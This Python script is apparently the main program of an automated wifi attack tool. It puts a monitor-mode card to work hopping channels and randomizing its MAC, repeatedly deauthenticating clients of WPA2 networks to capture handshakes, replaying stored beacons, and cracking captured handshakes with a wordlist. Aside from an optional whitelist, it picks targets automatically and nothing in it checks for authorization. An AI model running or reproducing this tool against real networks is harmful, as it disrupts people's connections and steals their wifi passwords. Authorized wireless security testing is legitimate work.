#!/usr/bin/env python3
##################################################
# Written for Vim Folding ##################
#########################################
from subprocess import Popen, PIPE
import argparse
import time
import sys
import os

from .modules import air, tags, logs, tools, interface
# Argument Parmesian {{{
parser = argparse.ArgumentParser(description='Automated Wifi Tool')

parser.add_argument('interface',type=str,
							help='The Monitor Mode Wifi Interface, REQUIRED')

parser.add_argument('-wl','--whitelist',type=str,default='nowhitelistgiven',
							help='A list of Macs to Leave Alone')

parser.add_argument('-bs','--beaconswarm',action='store_true',default=False,
							help='Swarm channels with known beacons, must run --beaconparse before trying this')

parser.add_argument('-bp','--beaconparse',action='store_true',default=False,
							help='parse capfiles for beacons, prepare them for use in beaconswarm, then exit')

parser.add_argument('-c','--channel',type=str,metavar='CH',default='1,6,11',
							help='Channels to focus on, defaults to 1,6,11')

parser.add_argument('-C','--crack',type=str,metavar='Wordlist',default='dontcrack',
							help='Attempt to crack new handshakes using Wordlist')

parser.add_argument('-s','--sound',action='store_true',default=False,
							help='play a sound everytime a handshake is captured')

parser.add_argument('-a','--attack',action='store_true',default=False,
							help='Enable Auto Attack Mode, Watches each channel -t secs')

parser.add_argument('-t','--time',type=int,metavar='TIME',default=45,
							help='The Ammount of time to focus on each Channel before hopping, only in Attack Mode, 45 secs by default')

args = parser.parse_args()

# System Checks
if sys.platform.lower() != 'linux':
	print('We support linux atm...')
	exit(1)
if os.getuid() != 0:
	print("Must run as root!")
	exit(1)
def parse_beacons(): # {{{
	if os.path.exists('caps') and os.path.exists('db'):
		from scapy.all import rdpcap
		import pickle
		blist = {}
		if os.path.exists('caps/beacons.cap'):
			os.remove('caps/beacons.cap')
		os.system('mergecap -w /tmp/mergedcaps.cap caps/*')
		os.system('tshark -r /tmp/mergedcaps.cap -R "(wlan.fc.type_subtype == 8)" -2 -F pcap -w caps/beacons.cap')
		beacons = rdpcap('caps/beacons.cap')
		for b in beacons:
			fbssid = b.addr2.upper().replace(':','')
			blist[fbssid] = b
		with open('db/beacons.db','wb') as dbf:
			pickle.dump(blist,dbf)
# }}}
if args.beaconparse:
	print("Parsing Beacons with mergecap and tshark")
	parse_beacons()
	exit(0)
if args.crack != 'dontcrack' and not os.path.exists(args.crack):
	print('Wordlist not found: '+str(args.crack))
	exit(1)
if args.whitelist != 'nowhitelistgiven' and not os.path.exists(args.whitelist):
	print('Whitelist file not found: '+str(args.whitelist))
	exit(1)
# }}}

#-------------------------------------------------
# Main Functionality
#-------------------------------------------------
def initialize(): # {{{
	# Global Variables and Objects {{{
	# objects {{{
	global tagger, logger, iface, iptools, airo, airos
	tagger = tags.Profiler() 			# Judges and Profiles Targets
	logger = logs.Logger()				# log stuff to disk
	iface = interface.Interface() # Our Curses Interface
	iptools = tools.iptools()			# Tools for ipconfig
	if args.beaconswarm: tagger.beaconswarming = True
	# }}}
	# action togglers {{{
	global do_attacks, do_airodump, do_chop
	if args.attack:
		do_attacks, do_chop = True, True
	else:
		do_airodump = True
	# }}}
	# time counters {{{
	global current_time, start_time, runtime, timestep, airo_counter, save_counter, chop_counter, suit_counter
	runtime = 0 # how long weve been running
	timestep = 0 # keep up with each full second
	airo_counter = 0 # each time we should do airo processing
	save_counter = 0 # last time we saved data to disk
	chop_counter = 0 # last time we channel hopped (in attack mode)
	suit_counter = 0 # how long its been since we have seen a suitable target
	current_time = int(time.time())
	start_time = current_time
	# }}}
	# data stores {{{
	global attack_counters, keyfiles, hsfiles, whitelist_macs, channels, current_channel
	attack_counters = {'networks':{}, 'clients':{}} # keeps up with various attack info
	channels = args.channel.split(',')
	current_channel = channels[0]
	hsfiles = {}				# dictionary of hsfiles  {bssid: filename}
	keyfiles = {}				# dictionary of keyfiles {bssid: filename}
	whitelist_macs = [] # array of macaddr strings
	# }}}
	# }}}
	# Check Monitor Mode {{{
	try:
		if not iptools.check_monitor_mode(args.interface):
			print('Monitor Mode is not Enabled on '+str(args.interface))
			exit(1)
	except:
		#print('Problem Checking Interface: '+str(args.interface))
		exit(2)
	# }}}
	load_databases()
	load_whitelist()
	load_keys()
	load_handshakes()
	# Start Processes
	airos = []
	if args.attack: # Attack Mode Startup {{{
		# Launch one airodump process for each channel, we will pause/unpause airodump when hopping {{{
		print('Starting One Airodump Process for each Channel... '+str(3*len(channels))+' Seconds Max')
		for c in channels:
			iptools.change_channel(args.interface, c)
			a = air.Airosuite(c, args.interface, current_time)
			a.open()
			time.sleep(2.1) # wait for csv file to be created
			a.pause()
			airos.append(a)
		airo = airos[channels.index(current_channel)]
		iptools.change_channel(args.interface, current_channel)
		airo.resume()
		# }}}
	# }}}
	else: # Recon Mode Startup {{{
		# Launch a single Airodump process that will do its own hopping (we cannot control hopping) {{{
		airos.append(air.Airosuite(args.channel, args.interface, current_time))
		airo = airos[0]
		airo.open()
		# }}}
	# }}}
# }}}
def start_looping(): # {{{
	global tagger, logger, iface, iptools, airo, airos
	global current_time, runtime, timestep, airo_counter, save_counter, chop_counter, suit_counter
	global do_attacks, do_airodump, do_chop
	global attack_counters, oldhandshakes, channels, current_channel
	current_time = int(time.time()) # current epoch, increment this every second afterwards

	if args.beaconswarm: beacon_swarm() # first swarm, all others happen on chops
	# Infinite loop, if loop ends, we will exit program
	while True: # {{{
		time.sleep(0.1)
		try:
			# -----------------------------------
			# Every 1/10th second
			# -----------------------------------
			timestep += 1
			# Handle User Input {{{
			# keypresses are first checked here, then passed to iface
			ret = 0
			c = iface.body.getch()
			if c == '-1': pass # nothing was pressed

			### Keys for Recon or Attack Mode #############################
			elif c == ord('m'):
				# Both Modes, Toggle the playing of Sounds
				args.sound = not args.sound

			elif c == ord('p'):
				# Attack Mode - Toggle Attacking
				if args.attack: do_attacks = not do_attacks
				# Recon Mode - Toggle Dumping
				else:
					if do_airodump: airo.pause()
					else: airo.resume()
					do_airodump = not do_airodump
					iface.refresh_body()

			### Attack Mode Only Keys #####################################
			elif args.attack and c == ord('n'): # Goto Next Channel
				chop_counter = args.time
			elif args.attack and c == ord('C'): # Pause/Unpause Channel hopping
				do_chop = not do_chop
			elif args.attack and c == ord('B'): # Do a Beacon Swarm on current Channel
				iface.set_text('Swarming Beacons!')
				beacon_swarm()

			################################################################
			else: # pass keypresses to iface
				ret = iface.keypress(c)

			if (ret == -1): break

			# End of User Input }}}
			# -----------------------------------
			# Every full Second
			# -----------------------------------
			if timestep == 10:
				timestep = 0
				# increment counters {{{
				runtime += 1
				save_counter += 1
				suit_counter += 1
				chop_counter += 1
				airo_counter += 1
				current_time += 1
				# }}}

				# ----------------------------------------------------------------------------------------
				# Periodic Events
				# ----------------------------------------------------------------------------------------
				# Every 1s: check if airodump is still running {{{
				if airo.dump_process.poll() is not None: break
				# }}}
				# Every 2s: grab new airo data {{{
				if airo_counter == 2:
					airo_counter = 0
					tagger.aplist = tagger.findtargets(airo.parse())
					load_whitelist()
					load_keys()
					load_handshakes()
				# }}}
				# Every 10s: cache and save data to disk {{{
				if save_counter == 10:
					save_counter = 0
					save_databases()
				# }}}

				# ----------------------------------------------------------------------------------------
				# Channel Hopping Events
				# ----------------------------------------------------------------------------------------
				# if there wasnt any suitable targets in the last 10 seconds hop to the next channel {{{
				if args.attack and suit_counter >= 10:
					chop_counter = args.time
					suit_counter = 0
				# }}}
				# hop channels every -t secs, unless a single channel was given to -c {{{
				if args.attack and do_chop and chop_counter >= args.time and len(channels) > 1:
					suit_counter = 0
					chop_counter = 0
					auths = airo.parse_auths()
					tagger.read_auths(auths)
					cur_ch = channels.index(current_channel)
					nxt_ch = cur_ch+1
					# pause current airodump process, then switchout airodump processes
					airo.pause()
					if nxt_ch == len(channels):
						current_channel = channels[0]
						airo = airos[0]
					else:
						current_channel = channels[nxt_ch]
						airo = airos[nxt_ch]
					# grab a new mac, then focus card onto next channel
					iptools.randomize_mac(args.interface)
					iptools.change_channel(args.interface, current_channel)
					# resume airodump process
					airo.resume()
					if args.beaconswarm:
						iface.set_text('Swarming Beacons!')
						beacon_swarm()
				# }}}

				# ----------------------------------------------------------------------------------------
				# Process All Data, Every Second
				# ----------------------------------------------------------------------------------------
				iface.body_data = []
				for ap in tagger.aplist:
					# prevent suitable targets on other channels {{{
					if args.attack and int(ap['channel']) != int(current_channel):
						ap['suitable'] = False
					# }}}
					# load an attack_counter for this ap and its clients {{{
					# Networks
					try: # load if exists already
						ap_id = attack_counters['networks'][ap['bssid']]
					except: # if first time being seen, create new template
						new_id = { 'handshake': False, 'last_hs_check': 0, 'last_assoc': 0, 'cracked': False}
						attack_counters['networks'][ap['bssid']] = new_id
						ap_id = attack_counters['networks'][ap['bssid']]
					# Clients
					for cl in ap['clients']:
						try: # exists
							cl_id = attack_counters['clients'][cl['mac']]
						except: # new
							new_id = { 'last_deauth': 0 }
							attack_counters['clients'][cl['mac']] = new_id
							cl_id = attack_counters['clients'][cl['mac']]
					# }}}
					# do we already have this networks handshake? {{{
					bssid = str(ap['bssid']).replace(':','')
					if bssid in hsfiles:
						ap_id['handshake'] = True
					else:
						ap_id['handshake'] = False
					if bssid in keyfiles:
						ap_id['cracked'] = True
					else:
						ap_id['cracked'] = False
					# }}}
					# If no handshake, check for one every few seconds {{{
					if not ap_id['handshake']:
						if (current_time-ap_id['last_hs_check']) >= 3 and runtime >= 10:
							ap_id['last_hs_check'] = current_time
							ap_id['handshake'] = airo.check_handshake(ap['essid'], ap['bssid'])
							if ap_id['handshake']: # got a new handshake
								if args.sound:
									cmd='mpv soundfile'
									Popen(cmd.split(' '), stdout=PIPE, stderr=PIPE, stdin=PIPE)
								if args.crack != 'dontcrack':
									iface.set_text('Cracking '+str(ap['essid']))
									airo.crack(ap['essid'], ap['bssid'], args.crack)
					# }}}
					# Do we Attack this AP? If so launch our Attacks {{{
					if args.attack and do_attacks and not ap_id['handshake'] and str(ap['bssid']).replace(':', '') not in whitelist_macs:
						if ap['suitable']: deauth_attack(ap)
					# }}}
					# If We have seen a suitable target, update suit_counter {{{
					if ap['suitable'] and ap_id['handshake'] is False: suit_counter = 0
					# }}}
					# Format AP and Send to Curses Interface {{{
					ap['handshake'] = ap_id['handshake']
					ap['cracked'] = ap_id['cracked']
					if str(ap['bssid']).replace(':','') in whitelist_macs:
						ap['suitable'] = False
						ap['whitelisted'] = True
					iface.body_data.append(tagger.format_ap(ap))
					# }}}
				iface.refresh_body()

		except KeyboardInterrupt:
			break
	# }}}

	# Loop has exited, begin closing procedures
	# Close Airodump processes {{{
	if args.attack:
		for a in airos:
			a.close()
	else:
		airo.close()
	# }}}
	# Save Data to Disk {{{
	save_databases()
	save_pcaps()
	# }}}
######### End of start_looping }}}

#-------------------------------------------------
# Load/Save Functions
#-------------------------------------------------
def load_handshakes(): # {{{
	# Load Existing Handshakes
	global hsfiles
	hsfiles = {}
	if not os.path.exists('hs'):
		os.mkdir('hs')
	hsdir = os.listdir('hs')
	for f in hsdir:
		bssid = f.split('_')[1]
		hsfiles[bssid] = f
# }}}
def load_whitelist(): # {{{
	if args.whitelist != 'nowhitelistgiven':
		global whitelist_macs
		whitelist_macs = []
		with open(args.whitelist, 'r') as wl:
			for line in wl:
				macaddress = line.split('|')[0]
				whitelist_macs.append(macaddress)
# }}}
def load_keys(): # {{{
	global keyfiles
	keyfiles = {}
	if os.path.exists('keys'):
		keys = os.listdir('keys')
		for key in keys:
			bssid = key.split('_')[0]
			keyfiles[bssid] = key
# }}}
def load_databases(): # {{{
	if os.path.exists(tagger.database_file):
		tagger.database = logger.load_db(tagger.database_file)
	if os.path.exists(tagger.beacondb_file):
		tagger.beacondb = logger.load_db(tagger.beacondb_file)
# }}}
def save_databases(): # {{{
	logger.save_db(tagger.database, tagger.database_file)
	logger.save_db(tagger.beacondb, tagger.beacondb_file)
# }}}
def save_pcaps(): # {{{
	seeds = []
	if not os.path.exists('caps'): os.mkdir('caps')
	for a in airos:
		seeds.append(a.capfile)
	cmd='mergecap -w caps/'+str(start_time)+'.cap '+str(' '.join(seeds))
	os.system(cmd)
	
# }}}

#-------------------------------------------------
# Attack Arsenal ( this should be its own module )
#-------------------------------------------------
def beacon_swarm(): # {{{
	global tagger
	tagger.beaconswarming = True
	for bssid in tagger.beacondb:
			beacon = tagger.beacondb[bssid]
			airo.sendpacket(beacon)
# }}}
def deauth_attack(ap): # {{{
	if len(ap['clients']) != 0 and 'WPA2' in ap['crypt']:

		for cl in ap['clients']:
			if cl['suitable'] and str(cl['mac']).replace(':','') not in whitelist_macs:
				cl_id = attack_counters['clients'][cl['mac']]

				# 8 seconds between each attempt
				we_should_deauth = False

				try: #previously deauthed
					last_deauth = current_time-cl_id['last_deauth']
					if last_deauth >= 8:
						we_should_deauth = True

				except KeyError: #first deauth
					we_should_deauth = True

				if we_should_deauth:
					cl_id['last_deauth'] = current_time
					airo.deauth(ap['essid'], cl['bssid'], cl['mac'])
# }}}

			

##################################################

def main():
	initialize() # define our globals and objects, then start processes
	iptools.randomize_mac(args.interface) # ensure we have a random mac

	try: # this is the equivalent to curses.wrapper()
		iface.start() # load our curses interface env
		start_looping() # begin doing things
		iface.close() # close our curses interface env
	except Exception as e:
		iface.close() # reset terminal settings, before raising error
		raise e

if __name__ == '__main__':
	main()
